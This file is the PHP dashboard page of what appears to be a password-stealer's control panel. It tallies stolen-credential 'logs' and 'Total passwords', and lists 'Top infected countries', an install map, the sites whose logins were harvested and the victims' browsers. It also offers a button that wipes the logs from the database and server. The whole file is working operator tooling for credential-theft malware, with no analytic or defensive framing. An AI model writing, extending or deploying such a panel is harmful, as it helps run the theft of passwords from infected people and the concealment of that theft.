<?php

// -------------------------------------------------------------------------
// Include config
include_once 'Configs/Main.Config.php';
include_once 'App/Engine.php';

// -------------------------------------------------------------------------
// auth checker
if($_SESSION["login"] != true)
{
	header('Location: login.php', true, 301);
	exit();
}

// -------------------------------------------------------------------------
// Actions
$action = $_GET["action"];

switch($action)
{
	case "clear_stats":
		clearStats($db);
		break;
		
	default:
		break;
}

// -------------------------------------------------------------------------
// Top sites count
$statitics = $db->query("SELECT * FROM `statistics` WHERE 1")->fetch_array();
$topsites = $db->query("SELECT * FROM `topsites` ORDER BY `topsites`.`Count` ASC");

$topSitesCount = 0;
$browsersCount = $statitics["Chromium"] + $statitics["Firefox"] + $statitics["IE"] + $statitics["Edge"] + $statitics["Opera"];

while($site = $topsites->fetch_assoc())
{
	$topSitesCount = $topSitesCount + $site["Count"];
}

// -------------------------------------------------------------------------
// Logs last week
$CurrentDate = date("Y-m-d H:i:s");
$LastWeekDate = date("Y-m-d H:i:s", strtotime(date("Y-m-d H:i:s")." -7 days"));

$lastweeklogs = $db->query("SELECT * FROM `logs` WHERE `DateAdded` BETWEEN '$LastWeekDate' AND '$CurrentDate'");

$logslastweek = 0;

while($lastlogs = $lastweeklogs->fetch_assoc())
{
	$logslastweek++;
}

// -------------------------------------------------------------------------
// Logs last 30 days
$CurrentDate = date("Y-m-d H:i:s");
$LastWeekDate = date("Y-m-d H:i:s", strtotime(date("Y-m-d H:i:s")." -30 days"));

$last30dayslogs = $db->query("SELECT * FROM `logs` WHERE `DateAdded` BETWEEN '$LastWeekDate' AND '$CurrentDate'");

$logslast30days = 0;

while($lastlogs = $last30dayslogs->fetch_assoc())
{
	$logslast30days++;
}

// -------------------------------------------------------------------------
// Calculating passwords last week
$CurrentDate = date("Y-m-d H:i:s");
$LastWeekDate = date("Y-m-d H:i:s", strtotime(date("Y-m-d H:i:s")." -7 days"));

$lastweeklogs = $db->query("SELECT * FROM `logs` WHERE `DateAdded` BETWEEN '$LastWeekDate' AND '$CurrentDate'");

$lastweekpasswords = 0;

while($lastlogs = $lastweeklogs->fetch_assoc())
{
	$lastweekpasswords = $lastweekpasswords + $lastlogs["CountPass"];
}

// -------------------------------------------------------------------------
// Calculating last week logs count than last week
$CurrentDate = date("Y-m-d H:i:s");
$LastWeekDate = date("Y-m-d H:i:s", strtotime(date("Y-m-d H:i:s")." -7 days"));
$ThanWeekDate = date("Y-m-d H:i:s", strtotime(date("Y-m-d H:i:s")." -14 days"));

$lastweeklogs = $db->query("SELECT * FROM `logs` WHERE `DateAdded` BETWEEN '$ThanWeekDate' AND '$LastWeekDate'");

$thanweekpasswords = 0;

while($lastlogs = $lastweeklogs->fetch_assoc())
{
	$thanweekpasswords++;
}

// -------------------------------------------------------------------------
// Calculating last month logs count than last month
$CurrentDate = date("Y-m-d H:i:s");
$LastWeekDate = date("Y-m-d H:i:s", strtotime(date("Y-m-d H:i:s")." -30 days"));
$ThanWeekDate = date("Y-m-d H:i:s", strtotime(date("Y-m-d H:i:s")." -60 days"));

$than30dayslogs = $db->query("SELECT * FROM `logs` WHERE `DateAdded` BETWEEN '$ThanWeekDate' AND '$LastWeekDate'");

$logsthan30days = 0;

while($lastlogs = $than30dayslogs->fetch_assoc())
{
	$logsthan30days++;
}

// -------------------------------------------------------------------------
// Topsites stats
$topsites = $db->query("SELECT * FROM `topsites` ORDER BY `Count` DESC LIMIT 5");

// -------------------------------------------------------------------------
// Logs
$logs = $db->query("SELECT * FROM `logs` ORDER BY `UID` DESC LIMIT 10;");

// -------------------------------------------------------------------------
// Countries stats
$countries_stats_array;
$statitics_countries = $db->query("SELECT * FROM `statitics_countries`");

while ($statitics_countries_one = $statitics_countries->fetch_assoc())
{ 
	$countries_stats_array[$statitics_countries_one["Code"]]["Count"] = $statitics_countries_one["Count"];
	$countries_stats_array[$statitics_countries_one["Code"]]["Name"] = $statitics_countries_one["Name"];
}

// -------------------------------------------------------------------------
// Clear stats
function clearStats($db)
{
	$db->query("UPDATE `statitics_countries` SET `Count`=0;");
	$db->query("UPDATE `statistics` SET `Logs`=0;");
	$db->query("UPDATE `statistics` SET `Passwords`=0;");
	$db->query("UPDATE `statistics` SET `Chromium`=0;");
	$db->query("UPDATE `statistics` SET `Firefox`=0;");
	$db->query("UPDATE `statistics` SET `IE`=0;");
	$db->query("UPDATE `statistics` SET `Edge`=0;");
	$db->query("UPDATE `statistics` SET `Opera`=0;");
	$db->query("TRUNCATE TABLE `topsites`");
	$db->query("TRUNCATE TABLE `logs`");
	
	echo "success";
	exit(0);
}

$pageID = "Dashboard";

include_once 'Models/Header.php';

?>
<div class="content content-fixed">
	<div class="container pd-x-0 pd-lg-x-10 pd-xl-x-0">
		<div class="d-sm-flex align-items-center justify-content-between mg-b-20 mg-lg-b-25 mg-xl-b-30">
			<div>
				<h4 class="mg-b-0 tx-spacing--1">Welcome to Dashboard</h4>
			</div>
			<div class="d-none d-md-block">
					<button onclick="clearStatsModal();" class="btn btn-sm pd-x-15 btn-white btn-uppercase"><i data-feather="trash" class="wd-10 mg-r-5"></i> Clear Stats</button>
			</div>
		</div>
		<?
		if (file_exists("install.php"))
		{
			?><div class="alert alert-danger" role="alert">Warning: Please, delete install.php file from server!</div><?
		}
		?>
		
		<div class="row row-xs">
			<div class="col-sm-6 col-lg-3">
				<div class="card card-body">
					<h6 class="tx-uppercase tx-11 tx-spacing-1 tx-color-02 tx-semibold mg-b-8">Total Logs</h6>
					<div class="d-flex d-lg-block d-xl-flex align-items-end">
						<h3 class="tx-normal tx-rubik mg-b-0 mg-r-5 lh-1"><? echo $statitics["Logs"]; ?></h3>
					</div>
				</div>
			</div>
			
			<div class="col-sm-6 col-lg-3 mg-t-10 mg-sm-t-0">
				<div class="card card-body">
					<h6 class="tx-uppercase tx-11 tx-spacing-1 tx-color-02 tx-semibold mg-b-8">Logs last week</h6>
					<div class="d-flex d-lg-block d-xl-flex align-items-end">
						<h3 class="tx-normal tx-rubik mg-b-0 mg-r-5 lh-1"><? echo $logslastweek; ?></h3>
						<p class="tx-11 tx-color-03 mg-b-0">
						<?
							if($statitics["Logs"] != 0)
							{
								$percent = calculatePercent($thanweekpasswords, $logslastweek, false);
							
								if($percent > 0)
								{
									?><span class="tx-medium tx-success"><? if($percent == INF) { echo "100"; }else{ echo $percent; } ?>% <i class="fas fa-arrow-up"></i></span> than last week</p><?
								}
								else
								{
									?><span class="tx-medium tx-danger"><? echo $percent; ?>% <i class="fas fa-arrow-down"></i></span> than last week</p><?
								}
							}
						?>
					</div>
				</div>
			</div>
			
			<div class="col-sm-6 col-lg-3 mg-t-10 mg-lg-t-0">
				<div class="card card-body">
					<h6 class="tx-uppercase tx-11 tx-spacing-1 tx-color-02 tx-semibold mg-b-8">Logs last 30 days</h6>
					<div class="d-flex d-lg-block d-xl-flex align-items-end">
						<h3 class="tx-normal tx-rubik mg-b-0 mg-r-5 lh-1"><? echo $logslast30days; ?></h3>
						<p class="tx-11 tx-color-03 mg-b-0">
						<?
							if($statitics["Logs"] != 0)
							{
								$percent = calculatePercent($logsthan30days ,$logslast30days, true);
							
								if($percent > 0)
								{
									?><span class="tx-medium tx-success"><? if($percent == INF) { echo "100"; }else{ echo $percent; } ?>% <i class="fas fa-arrow-up"></i></span> than last week</p><?
								}
								else
								{
									?><span class="tx-medium tx-danger"><? echo $percent; ?>% <i class="fas fa-arrow-down"></i></span> than last week</p><?
								}
							}
						?>
					</div>
				</div>
			</div>
			
			<div class="col-sm-6 col-lg-3 mg-t-10 mg-lg-t-0">
				<div class="card card-body">
					<h6 class="tx-uppercase tx-11 tx-spacing-1 tx-color-02 tx-semibold mg-b-8">Total passwords</h6>
					<div class="d-flex d-lg-block d-xl-flex align-items-end">
						<h3 class="tx-normal tx-rubik mg-b-0 mg-r-5 lh-1"><? echo $statitics["Passwords"]; ?></h3>
						<?
						if($statitics["Logs"] != 0)
						{
						?>
							<p class="tx-11 tx-color-03 mg-b-0">
								<span class="tx-medium tx-success"><? echo $lastweekpasswords; ?> <i class="fas fa-plus"></i></span> this week</p>
						<?
						}
						?>
					</div>
				</div>
			</div>
			
			<div class="col-lg-12 col-xl-8 mg-t-10">
				<div class="card mg-b-10">
					<div class="card-header pd-t-20 d-sm-flex align-items-start justify-content-between bd-b-0 pd-b-0">
						<div>
							<h6 class="mg-b-5">Interactive World Map</h6>
							<p class="tx-13 tx-color-03 mg-b-0">Your installs by countries</p>
						</div>
					</div>
					<div>
						<? include_once 'Models/WorldMap.php'; ?>
					</div>
				</div>
			</div>
			
			<div class="col-md-6 col-xl-4 mg-t-10 order-md-1 order-xl-0">
				<div class="card ht-lg-100p">
					<div class="card-header d-flex align-items-center justify-content-between">
						<h6 class="mg-b-0">Top infected countries</h6>
					</div>
					<div class="card-body pd-0">
						<div class="table-responsive">
							<table class="table table-borderless table-dashboard table-dashboard-one">
								<thead>
									<tr>
										<th class="wd-40">Country</th>
										<th class="wd-25 text-right">Logs</th>
									</tr>
								</thead>
								<tbody>
								<?
								
								$countries_stats_array_ccc = 0;
								
								arsort($countries_stats_array);
								
								foreach ($countries_stats_array as $key => $val){
								
									if($countries_stats_array_ccc == 13)
									{
										break;
									}
								
								?>
									<tr>
										<td class="tx-medium"><img src="Template/img/flags/<? echo strtolower($key); ?>.png" alt="" title=""> <? echo $countries_stats_array[$key]["Name"]; ?></td>
										<td class="text-right"><? echo $countries_stats_array[$key]["Count"]; ?></td>
									</tr>
									
								<?
								
								$countries_stats_array_ccc++;
								}
								?>
								</tbody>
							</table>
						</div>
					</div>
				</div>
			</div>
			
			<div class="col-lg-6 mg-t-10">
				<div class="card">
					<div class="card-header d-flex align-items-start justify-content-between">
						<h6 class="lh-5 mg-b-0">Top Sites</h6>
					</div>
					<div class="card-body pd-y-15 pd-x-10">
						<div class="table-responsive">
							<table class="table table-borderless table-sm tx-13 tx-nowrap mg-b-0">
								<thead>
									<tr class="tx-10 tx-spacing-1 tx-color-03 tx-uppercase">
										<th>Url</th>
										<th class="text-right">Percentage (%)</th>
										<th class="text-right">Count</th>
									</tr>
								</thead>
								<tbody>
								<?
								while($site = $topsites->fetch_assoc())
								{
									$percent = calculatePercent($topSitesCount, $site["Count"], false); ?>
									<tr>
										<td class="align-middle tx-medium"><? echo $site["Host"] ?></td>
										<td class="align-middle text-right">
											<div class="wd-150 d-inline-block">
												<div class="progress ht-4 mg-b-0">
													<div class="progress-bar bg-teal wd-<? echo $percent; ?>p" role="progressbar" aria-valuenow="<?php echo $percent; ?>" aria-valuemin="0" aria-valuemax="100"></div>
												</div>
											</div>
										</td>
										<td class="align-middle text-right"><span class="tx-medium"><? echo $site["Count"]; ?></span></td>
									</tr>
								<? } ?>
								</tbody>
							</table>
						</div>
					</div>
				</div>
			</div>
			
			<div class="col-lg-6 mg-t-10">
				<div class="card">
					<div class="card-header d-sm-flex align-items-start justify-content-between">
						<h6 class="lh-5 mg-b-0">Top Browsers</h6>
					</div>
					<div class="card-body pd-y-15 pd-x-10">
						<div class="table-responsive">
							<table class="table table-borderless table-sm tx-13 tx-nowrap mg-b-0">
								<thead>
									<tr class="tx-10 tx-spacing-1 tx-color-03 tx-uppercase">
										<th class="wd-5p">&nbsp;</th>
										<th>Browser</th>
										<th class="text-right">Percentage (%)</th>
										<th class="text-right">Count</th>
									</tr>
								</thead>
								<tbody>
									<tr>
										<td><i class="fab fa-chrome tx-primary op-6"></i></td>
										<td class="tx-medium">Chromium</td>
										<td class="text-right"><? echo calculatePercent($browsersCount, $statitics["Chromium"], true); ?>%</td>
										<td class="text-right"><? echo $statitics["Chromium"]; ?></td>
									</tr>
									<tr>
										<td><i class="fab fa-firefox tx-orange"></i></td>
										<td class="tx-medium">Mozilla Firefox</td>
										<td class="text-right"><? echo calculatePercent($browsersCount, $statitics["Firefox"], true); ?>%</td>
										<td class="text-right"><? echo $statitics["Firefox"]; ?></td>
									</tr>
									<tr>
										<td><i class="fab fa-opera tx-danger"></i></td>
										<td class="tx-medium">Opera</td>
										<td class="text-right"><? echo calculatePercent($browsersCount, $statitics["Opera"], true); ?>%</td>
										<td class="text-right"><? echo $statitics["Opera"]; ?></td>
									</tr>
									<tr>
										<td><i class="fab fa-internet-explorer tx-primary"></i></td>
										<td class="tx-medium">Internet Explorer</td>
										<td class="text-right"><? echo calculatePercent($browsersCount, $statitics["IE"], true); ?>%</td>
										<td class="text-right"><? echo $statitics["IE"]; ?></td>
									</tr>
									<tr>
										<td><i class="fab fa-edge tx-primary"></i></td>
										<td class="tx-medium">Microsoft Edge</td>
										<td class="text-right"><? echo calculatePercent($browsersCount, $statitics["Edge"], true); ?>%</td>
										<td class="text-right"><? echo $statitics["Edge"]; ?></td>
									</tr>
								</tbody>
							</table>
						</div>
					</div>
				</div>
			</div>
								
		</div>
	</div>
</div>
</div>
</div>
</div>

<div class="modal fade" id="clearStatsWindow" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel6" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered" role="document" style="max-width: 30%;">
		<div class="modal-content tx-14">
			<div class="modal-header">
				<h6 class="modal-title" id="exampleModalLabel6">Clear statitics?</h6>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body2">
				<div>
					<br>
					<ul>
						<li>Clear wolrd map information, infected countries info</li>
						<li>Clear logs count, logs stats</li>
						<li>Clear logs from database and server</li>
						<li>Clear top sites counter, top browsers</li>
					</ul>
				</div>
			</div>
			<div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                    <button type="button" onclick="clearStats();" class="btn btn-primary">Clear</button>
                  </div>
		</div>
	</div>
</div>

<script src="Template/lib/bootstrap/js/bootstrap.bundle.min.js"></script>
<script src="Template/lib/feather-icons/feather.min.js"></script>
<script src="Template/lib/perfect-scrollbar/perfect-scrollbar.min.js"></script>

<script src="Template/lib/chart.js/Chart.bundle.min.js"></script>
<script src="Template/lib/chart.js/Chart.js"></script>

<script src="Template/lib/jquery.flot/jquery.flot.js"></script>
<script src="Template/lib/jquery.flot/jquery.flot.stack.js"></script>
<script src="Template/lib/jquery.flot/jquery.flot.resize.js"></script>

<script src="Template/assets/js/dashforge.js"></script>

<script>

function clearStatsModal()
{
	$('#clearStatsWindow').modal({show:true});
}

function clearStats()
{
	var xhr = new XMLHttpRequest();

	xhr.open('GET', `dashboard.php?action=clear_stats`);
	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	
	xhr.onload = function() 
	{
		if (xhr.status === 200 && xhr.responseText == "success")
		{
			new Noty({
				timeout: 3500,
				text: 'Success: stats clearned',
				type: 'success',
				layout: 'topRight',
				theme: 'bootstrap-v4',
				progressBar: true
				
			}).show();
		}
		else
		{
			new Noty({
				timeout: 3500,
				text: 'Error: invalid response',
				type: 'error',
				layout: 'topRight',
				theme: 'bootstrap-v4',
				progressBar: true
				
			}).show();
		}
	};
	xhr.send(encodeURI('name'));
}

</script>

<? include_once 'Models/Footer.php'; ?>
</body>
</html>